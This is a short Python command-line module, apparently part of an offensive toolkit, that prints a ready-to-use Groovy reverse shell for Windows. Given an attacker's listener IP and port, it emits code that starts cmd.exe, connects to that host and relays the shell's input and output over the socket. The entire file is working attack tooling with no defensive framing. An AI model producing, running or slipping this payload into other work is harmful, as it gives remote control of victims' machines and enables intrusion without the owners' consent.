import click
from colorama import Fore

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Print code only (no label).")
def command(listener_ip, listener_port, raw):
    """Return Groovy reverse shell code snippet"""
    code = (f'String host="{listener_ip}";\n'
            f'int port={listener_port};\n'
            f'String cmd="cmd.exe";\n'
            f'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();'
            f'Socket s=new Socket(host,port);'
            f'InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();'
            f'OutputStream po=p.getOutputStream(),so=s.getOutputStream();'
            f'while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());'
            f'while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());'
            f'so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};'
            f'p.destroy();s.close();')
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Groovy reverse shell:\n{Fore.WHITE}{code}")
    else:
        click.secho(code, nl=False)
